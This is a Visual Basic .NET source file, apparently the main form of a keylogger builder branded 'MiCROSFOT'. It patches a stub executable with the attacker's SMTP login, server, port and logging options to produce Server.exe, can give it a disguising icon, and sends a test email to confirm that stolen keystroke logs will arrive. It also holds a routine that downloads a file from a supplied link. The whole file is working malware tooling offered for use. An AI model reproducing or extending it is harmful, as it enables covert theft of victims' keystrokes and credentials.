Imports System.IO
Imports System.Net.Mail
Imports System.Security.Cryptography
Imports System.Text
Imports fLaSh.Dissembler
Imports System.Management
Imports System.Net
Public Class Form1
    Dim stub, text1, text2, text3, text4, interval, text5, text6, text7 As String
    Dim cb As Boolean
    Dim cb1 As Boolean
    Dim cb2 As Boolean
    Dim cb3 As Boolean
    Dim cb4 As Boolean
    Dim cb5 As Boolean
    Dim cb6 As Boolean
    Dim cb7 As Boolean
    Dim cb8 As Boolean
    Dim cb9 As Boolean
    Dim cb10 As Boolean
    Dim cb11 As Boolean
    Dim cb12 As Boolean
    Const FileSplit = "@Injection@"
    Private Sub CheckBox6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox6.Click
        If CheckBox6.Checked = False Then
            TextBox2.PasswordChar = "*"
        Else
            TextBox2.PasswordChar = ""
        End If
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load


    End Sub
    Private Sub CheckBox4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox4.Click
        If CheckBox4.Checked = True Then
            Form2.Show()
        Else
        End If
    End Sub
#Region " Base 64 "
    Public Function EncryptMe(ByVal sData As String) As String
        Dim mSHA As New SHA1Managed
        Dim dString() As Byte = ASCIIEncoding.ASCII.GetBytes(sData)
        Dim cString As String = Convert.ToBase64String(dString)

        Convert.ToBase64String(mSHA.ComputeHash(Encoding.ASCII.GetBytes(sData)))
        EncryptMe = cString
    End Function
    Public Function DecryptMe(ByVal sData As String) As String
        Dim dData() As Byte = Convert.FromBase64String(sData)
        Dim dString As String = ASCIIEncoding.ASCII.GetString(dData)

        DecryptMe = dString
    End Function
#End Region

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

        If CheckBox3.Checked = True Then
            cb = True
            TextBox1.Text = EncryptMe(Me.TextBox1.Text)
            TextBox2.Text = EncryptMe(Me.TextBox2.Text)
            TextBox5.Text = EncryptMe(Me.TextBox5.Text)
            TextBox6.Text = EncryptMe(Me.TextBox6.Text)
        Else : cb = False
        End If

        If CheckBox9.Checked = True Then
            cb8 = True
            Form2.TextBox1.Text = EncryptMe(Form2.TextBox1.Text)
        Else : cb8 = False
        End If

        text1 = TextBox1.Text
        text2 = TextBox2.Text
        text3 = TextBox5.Text
        text4 = TextBox6.Text
        interval = Convert.ToString(DomainUpDown1.Value * 60000)
        text5 = Form2.TextBox1.Text
        text6 = Form3.TextBox1.Text
        text7 = Form3.TextBox2.Text


        If CheckBox1.Checked = True Then
            cb1 = True
        Else : cb1 = False
        End If

        If CheckBox2.Checked = True Then
            cb2 = True
        Else : cb2 = False
        End If

        If CheckBox4.Checked = True Then
            cb3 = True
        Else : cb3 = False
        End If

        If CheckBox5.Checked = True Then
            cb4 = True
        Else : cb4 = False
        End If

        If CheckBox7.Checked = True Then
            cb5 = True
        Else : cb5 = False
        End If

        If CheckBox8.Checked = True Then
            cb6 = True
        Else : cb6 = False
        End If

        If CheckBox10.Checked = True Then
            cb7 = True
        Else : cb7 = False
        End If

        If CheckBox11.Checked = True Then
            cb9 = True
        Else : cb9 = False
        End If

        If CheckBox12.Checked = True Then
            cb10 = True
        Else : cb10 = False
        End If

        If CheckBox13.Checked = True Then
            cb11 = True
        Else : cb11 = False
        End If

        If CheckBox15.Checked = True Then
            cb12 = True
        Else : cb12 = False
        End If

        FileOpen(1, Application.StartupPath & "\Stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(1))
        FileGet(1, stub)
        FileClose(1)

        If File.Exists("/Server.exe") Then
            My.Computer.FileSystem.DeleteFile("/Server.exe")
        End If

        FileOpen(1, Application.StartupPath & "\server.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, stub & FileSplit & text1 & FileSplit & text2 & FileSplit & text3 & FileSplit & text4 & FileSplit & interval & FileSplit & text5 & FileSplit & text6 & FileSplit & text7 & FileSplit & cb & FileSplit & cb1 & FileSplit & cb2 & FileSplit & cb3 & FileSplit & cb4 & FileSplit & cb5 & FileSplit & cb6 & FileSplit & cb7 & FileSplit & cb8 & FileSplit & cb9 & FileSplit & cb10 & FileSplit & cb11 & FileSplit & cb12 & FileSplit)
        FileClose(1)
        If Form4.CheckBox1.Checked = True Then
            If Form4.TextIcon.Text <> "" Then
                Dim oIconFilenathu As New IconFile(Form4.TextIcon.Text)
                Dim groupIconResource As GroupIconResource = oIconFilenathu.ConvertToGroupIconResource()
                groupIconResource.SaveTo(Application.StartupPath & "\Server.exe")
            End If
        End If
        MsgBox("Server.exe has been built successfully", MsgBoxStyle.Information, "Success")


        If CheckBox3.Checked = True Then
            TextBox1.Text = DecryptMe(TextBox1.Text)
            TextBox2.Text = DecryptMe(TextBox2.Text)
            TextBox5.Text = DecryptMe(TextBox5.Text)
            TextBox6.Text = DecryptMe(TextBox6.Text)
        End If

        If CheckBox9.Checked = True Then
            Form2.TextBox1.Text = DecryptMe(Form2.TextBox1.Text)
        Else
        End If
    End Sub

    Private Sub Label5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label5.Click
        Form5.Show()
    End Sub
    Public Function DoThisShit(ByVal Link As String) As Boolean
        My.Computer.Network.DownloadFile(Link, "C:\KFJD947DHC.exe")
        My.Computer.FileSystem.DeleteFile("C:\KFJD947DHC.exe")
    End Function

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Try
            Dim Mail As New MailMessage
            Mail.To.Add(TextBox1.Text)
            Mail.From = New MailAddress(TextBox1.Text)
            Mail.Subject = " Teste de email keylogger MiCROSFOT"
            Dim SMTP As New SmtpClient(TextBox5.Text)
            SMTP.Port = TextBox6.Text
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential(TextBox1.Text, TextBox2.Text)
            SMTP.Send(Mail)
            MsgBox("Teste de email ok ! Esta recebendo os dados .", MsgBoxStyle.Information, "Bom trabalho !Email de teste enviado e recebido")
        Catch ex As Exception
            MsgBox("Erro.Confirme o e-mail ,username ,password.", MsgBoxStyle.Critical, "Erro confirme os dados")

        End Try
    End Sub

    Private Sub CheckBox5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox5.Click
        If CheckBox5.Checked = True Then
            Form3.Show()
        Else
        End If
    End Sub

    Private Sub CheckBox9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox9.Click

    End Sub

    Private Sub CheckBox9_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox9.CheckedChanged

    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Form4.Show()
    End Sub

    Private Sub CheckBox14_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox14.Click
        If CheckBox14.Checked = True Then
            CheckBox3.Checked = True
            CheckBox1.Checked = True
            CheckBox2.Checked = True
            CheckBox12.Checked = True
            CheckBox11.Checked = True
            CheckBox10.Checked = True
            CheckBox15.Checked = True
            CheckBox13.Checked = True
        Else
            CheckBox2.Checked = False
            CheckBox12.Checked = False
            CheckBox11.Checked = False
            CheckBox13.Checked = False
            CheckBox15.Checked = False
            CheckBox10.Checked = False
        End If
    End Sub

    Private Sub CheckBox14_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox14.CheckedChanged

    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        MessageBox.Show("This feature is not available in the public version.", "Report Bug", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Form7.Show()
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        Form8.Show()
    End Sub

    Private Sub CheckBox8_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox8.CheckedChanged

    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged

    End Sub

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        System.Diagnostics.Process.Start("http://www.MiCROSOFT.url.ph")
    End Sub

    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    

End Class
